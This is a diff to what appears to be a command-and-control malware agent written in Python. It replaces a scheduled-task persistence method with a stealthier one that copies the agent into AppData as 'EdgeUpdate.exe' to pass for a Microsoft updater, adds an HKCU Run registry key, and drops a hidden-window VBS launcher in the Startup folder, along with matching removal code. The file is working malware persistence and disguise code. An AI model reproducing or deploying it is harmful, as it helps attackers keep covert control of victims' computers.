@@ -373,21 +373,43 @@ def install_persistence():
         except Exception as e:
             print(f"[!] crontab fail: {e}")
     else:
-        ps = (
-            '$action = New-ScheduledTaskAction -Execute ' + "'" + sys.executable + "'" +
-            " -Argument '" + agent_path + " --server " + srv + "'\n"
-            '$trigger = New-ScheduledTaskTrigger -AtStartup\n'
-            'Register-ScheduledTask -TaskName C2Agent -Action $action -Trigger $trigger -Force\n'
-        )
+        # Windows: copy to AppData with legit name, add to startup
+        import shutil
+        local_appdata = os.environ.get("LOCALAPPDATA", os.environ.get("APPDATA", os.path.expanduser("~")))
+        hide_dir = os.path.join(local_appdata, "Microsoft", "EdgeUpdate")
+        target = os.path.join(hide_dir, "EdgeUpdate.exe")
         try:
-            tf = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "install_c2.ps1")
-            with open(tf, "w") as f:
-                f.write(ps)
-            subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", tf], check=True)
-            os.unlink(tf)
-            print("[+] Windows scheduled task installed")
+            os.makedirs(hide_dir, exist_ok=True)
+            if os.path.abspath(sys.executable) != os.path.abspath(target):
+                shutil.copy2(sys.executable, target)
+            _add_windows_startup("MicrosoftEdgeUpdate", target)
+            print(f"[+] Windows persistence: {target}")
         except Exception as e:
             print(f"[!] Windows install fail: {e}")
+
+def _add_windows_startup(name, target):
+    # Registry Run key (HKCU, no admin)
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{target}" --no-install')
+        winreg.CloseKey(key)
+        print(f"[+] Registry Run key: {name}")
+    except Exception:
+        pass
+    # Startup folder fallback (VBS for hidden window)
+    try:
+        startup = os.path.join(os.environ.get("APPDATA", ""),
+            "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        if startup and os.path.isdir(startup):
+            vbs = os.path.join(startup, f"{name}.vbs")
+            if not os.path.exists(vbs):
+                with open(vbs, "w") as f:
+                    f.write('CreateObject("Wscript.Shell").Run "' + target + ' --no-install", 0, False\n')
+                print(f"[+] Startup folder: {vbs}")
+    except Exception:
+        pass
 
 def remove_persistence():
     if platform.system() != "Windows":
@@ -403,10 +425,30 @@ def remove_persistence():
             pass
     else:
         try:
-            subprocess.run(["schtasks", "/delete", "/tn", "C2Agent", "/f"], capture_output=True)
-            print("[+] Windows task removed")
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+            winreg.DeleteValue(key, "MicrosoftEdgeUpdate")
+            winreg.CloseKey(key)
         except Exception:
             pass
+        try:
+            startup = os.path.join(os.environ.get("APPDATA", ""),
+                "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+            if startup:
+                lnk = os.path.join(startup, "MicrosoftEdgeUpdate.url")
+                if os.path.exists(lnk):
+                    os.unlink(lnk)
+        except Exception:
+            pass
+        local_appdata = os.environ.get("LOCALAPPDATA", os.environ.get("APPDATA", ""))
+        target = os.path.join(local_appdata, "Microsoft", "EdgeUpdate", "EdgeUpdate.exe")
+        if os.path.exists(target):
+            try:
+                os.unlink(target)
+            except Exception:
+                pass
+        print("[+] Windows persistence removed")
 
 # ─── main ────────────────────────────────────────────────────────────
 def main():
